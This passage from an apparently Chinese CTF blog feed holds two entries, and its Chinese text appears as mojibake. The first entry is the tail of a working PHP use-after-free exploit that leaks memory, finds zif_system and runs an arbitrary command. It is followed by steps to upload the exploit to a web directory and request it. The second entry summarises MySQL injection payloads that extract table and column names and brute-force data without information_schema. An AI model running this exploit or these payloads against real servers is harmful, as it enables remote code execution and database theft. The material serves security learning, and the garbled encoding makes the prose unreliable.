<span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€å°†å…¶ä¸Šä¼ åˆ°**&#x2F;var&#x2F;www&#x2F;html&#x2F;runtime&#x2F;session&#x2F;<strong>ä¸‹ï¼Œå³æˆ‘è¿™é‡Œçš„</strong>1.php**æ–‡ä»¶</p><p><img src="https://img-blog.csdnimg.cn/43402dfcef7141649193bbf7e3b01e14.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¹‹ååœ¨è®¿é—®1.phpæ–‡ä»¶å³å¯è·å¾—flag</p><p><img src="https://img-blog.csdnimg.cn/0c50b621d95340479b2aee86be84f51c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      <categories>
          
          <category> ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thinkphp </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ— åˆ—åæ³¨å…¥å§¿åŠ¿æ€»ç»“</title>
      <link href="/2021/12/12/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
      <url>/2021/12/12/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="æ— åˆ—åæ³¨å…¥å§¿åŠ¿æ€»ç»“"><a href="#æ— åˆ—åæ³¨å…¥å§¿åŠ¿æ€»ç»“" class="headerlink" title="æ— åˆ—åæ³¨å…¥å§¿åŠ¿æ€»ç»“"></a>æ— åˆ—åæ³¨å…¥å§¿åŠ¿æ€»ç»“</h1><h2 id="æ„Ÿå—"><a href="#æ„Ÿå—" class="headerlink" title="æ„Ÿå—"></a>æ„Ÿå—</h2><p>ä»å­¦ä¹ å®‰å…¨ä»¥æ¥ï¼Œè¿˜æœªè‡ªå·±æ€»ç»“è¿‡ï¼Œå¾€å¾€ä¸€æ—¶ä¼šäº†å°±ä¸å†ç†ä¼šï¼Œé‡åˆ°ç›¸ä¼¼çš„é¢˜çš„æ—¶å€™åˆå†¥æ€è‹¦æƒ³æ‰èƒ½å›æƒ³èµ·æ¥ï¼Œæ‰€ä»¥å†³å®šä»ä»Šå¤©å¼€å§‹ï¼Œè§„å¾‹çš„å¯¹ä¸€äº›æ–¹æ³•è¿›è¡Œæ€»ç»“ã€‚</p><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>åœ¨<strong>mysql</strong>æ•°æ®åº“ä¸­ï¼Œ<strong>information_schema</strong>æ•°æ®åº“ä¿å­˜ç€mysqlæ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬äº†æ•°æ®åº“åï¼Œè¡¨åï¼Œå­—æ®µåç­‰ï¼Œè€Œé¢˜ç›®åˆ™ä¼šæœ‰æ„çš„è¿‡æ»¤æ‰è¿™ä¸ªåº“ï¼Œè¿™æ—¶ï¼Œæˆ‘ä»¬å°±å¾—åˆ©ç”¨å…¶ä»–æ‰‹æ®µæ¥ç»•è¿‡ã€‚</p><h3 id="çˆ†åº“åå’Œè¡¨å"><a href="#çˆ†åº“åå’Œè¡¨å" class="headerlink" title="çˆ†åº“åå’Œè¡¨å"></a>çˆ†åº“åå’Œè¡¨å</h3><p><strong>å…¶ä»–åº“æˆ–è€…è§†å›¾ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysqlï¼š</span><br><span class="line">mysql.innodb_table_stats</span><br><span class="line">mysql.innodb_index_stats</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sysï¼š</span><br><span class="line">x$schema_table_statistics_with_buffer</span><br><span class="line">schema_table_statistics_with_buffer</span><br><span class="line"></span><br><span class="line">è§†å›¾ï¼š</span><br><span class="line">schema_auto_increment_columns</span><br></pre></td></tr></table></figure><p><strong>payloadï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from |mysql.innodb_table_stats|x$schema_table_statistics_with_buffer|schema_auto_increment_columns|.....|</span><br></pre></td></tr></table></figure><h3 id="å–åˆ«åç»•è¿‡åˆ—åæŸ¥æ•°æ®"><a href="#å–åˆ«åç»•è¿‡åˆ—åæŸ¥æ•°æ®" class="headerlink" title="å–åˆ«åç»•è¿‡åˆ—åæŸ¥æ•°æ®"></a><strong>å–åˆ«åç»•è¿‡åˆ—åæŸ¥æ•°æ®</strong></h3><p><strong>åŸºæœ¬æŸ¥è¯¢ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tp_user;</span><br><span class="line">+----------+----------+------+--------+</span><br><span class="line">| username | password | id   | status |</span><br><span class="line">+----------+----------+------+--------+</span><br><span class="line">| Tom      | 123      | 1    | 1      |</span><br><span class="line">| Bob      | 1234     | 2    | 2      |</span><br><span class="line">| Dam      | 12345    | 3    | 3      |</span><br><span class="line">| Tony     | a        | 4    | 4      |</span><br><span class="line">| Tony     | a        | 4    | 4      |</span><br><span class="line">| xi       | 123      | NULL | NULL   |</span><br><span class="line">+----------+----------+------+--------+</span><br></pre></td></tr></table></figure><p><strong>å°†åˆ—åè½¬æ¢ä¸ºä»»ä½•å¯é€‰çš„å·²çŸ¥å€¼ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3,4 union select * from tp_user;</span><br><span class="line">+------+-------+------+------+</span><br><span class="line">| 1    | 2     | 3    | 4    |</span><br><span class="line">+------+-------+------+------+</span><br><span class="line">| 1    | 2     | 3    | 4    |</span><br><span class="line">| Tom  | 123   | 1    | 1    |</span><br><span class="line">| Bob  | 1234  | 2    | 2    |</span><br><span class="line">| Dam  | 12345 | 3    | 3    |</span><br><span class="line">| Tony | a     | 4    | 4    |</span><br><span class="line">| xi   | 123   | NULL | NULL |</span><br><span class="line">+------+-------+------+------+</span><br></pre></td></tr></table></figure><p><strong>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨1ï¼Œ2ï¼Œ3ï¼Œ4æ¥ä»£æ›¿åˆ—åäº†ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select `1` from (select 1,2,3,4 union select * from tp_user) as a;</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">| Tom  |</span><br><span class="line">| Bob  |</span><br><span class="line">| Dam  |</span><br><span class="line">| Tony |</span><br><span class="line">| xi   |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p><strong>payloadï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select group_concat(a) from(select 1 as a,2 as b,3 as c,4 as d union select * from tp_user)as m),3&#x27;</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨joinçˆ†åˆ—å"><a href="#åˆ©ç”¨joinçˆ†åˆ—å" class="headerlink" title="åˆ©ç”¨joinçˆ†åˆ—å"></a>åˆ©ç”¨joinçˆ†åˆ—å</h3><p>éœ€è¦æœ‰å›æ˜¾æ‰èƒ½ä½¿ç”¨</p><p>ç”±äºjoinæ˜¯å°†ä¸¤å¼ è¡¨çš„åˆ—åç»™åŠ èµ·æ¥ï¼Œæ‰€ä»¥æœ‰å¯èƒ½ä¼šäº§ç”Ÿç›¸åŒçš„åˆ—åï¼Œè€Œåœ¨ä½¿ç”¨åˆ«åæ—¶ï¼Œæ˜¯ä¸å…å‡ºç°ç›¸åŒçš„åˆ—åçš„ï¼Œå› æ­¤å½“å®ƒä»¬ä¸¤ä¸ªä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå°±ä¼šçˆ†å‡ºç›¸åŒçš„åˆ—åçš„åç§°ï¼Œä»è€Œè·å¾—åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tp_one;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| Tom      | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tp_one union select * from (select * from tp_one as a join tp_one as b) as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tp_one union select * from (select * from tp_one as a join tp_one as b using(username)) as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;password&#x27;</span><br></pre></td></tr></table></figure><p><strong>payloadï¼š</strong></p><p>è·å–ç¬¬ä¸€ä¸ªåˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union all select * from (select * from users as a join users as b)as c#</span><br></pre></td></tr></table></figure><p>è·å–ä¸‹ä¸€ä¸ªåˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union all select*from (select * from users as a join users as b using(username))as c#</span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦æ¯”è¾ƒæŸ¥è¯¢"><a href="#å­—ç¬¦æ¯”è¾ƒæŸ¥è¯¢" class="headerlink" title="å­—ç¬¦æ¯”è¾ƒæŸ¥è¯¢"></a>å­—ç¬¦æ¯”è¾ƒæŸ¥è¯¢</h3><p>è¦çŸ¥é“æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²çš„å¤§å°ä¸å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯æ²¡æœ‰å…³ç³»çš„ï¼Œç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œä¼šå„å–ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é¦–å­—ç¬¦asciiç æ¥æ¯”è¾ƒï¼Œä¸ç­‰å¼æˆç«‹è¿”å›1ï¼Œä¸ç­‰å¼ä¸æˆç«‹è¿”å›0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x27;g&#x27;æ˜¯æ¯”&#x27;f&#x27;å¤§çš„ï¼Œæ‰€ä»¥è¿”å›1</span><br><span class="line">mysql&gt; select (select &#x27;g&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| (select &#x27;g&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                              1 |</span><br><span class="line">+--------------------------------+</span><br><span class="line"></span><br><span class="line">å½“ç›¸ç­‰æˆ–è€…å°äºæ—¶ï¼Œå°±ä¼šè¿”å›0</span><br><span class="line">mysql&gt; select (select &#x27;f&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| (select &#x27;f&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                              0 |</span><br><span class="line">+--------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select &#x27;d&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| (select &#x27;d&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                              0 |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°±å¯ä»¥é€å­—ç¬¦çˆ†ç ´æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select &#x27;fm&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| (select &#x27;fm&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|                               1 |</span><br><span class="line">+---------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select &#x27;fl&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| (select &#x27;fl&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|                               0 |</span><br><span class="line">+---------------------------------+</span><br></pre></td></tr></table></figure><p>å› ä¸ºåœ¨<strong>ç›¸ç­‰</strong>æ—¶è¿”å›<strong>0</strong>ï¼Œæ‰€ä»¥åœ¨è¿›è¡Œçˆ†ç ´æ—¶ï¼Œæˆ‘ä»¬çˆ†ç 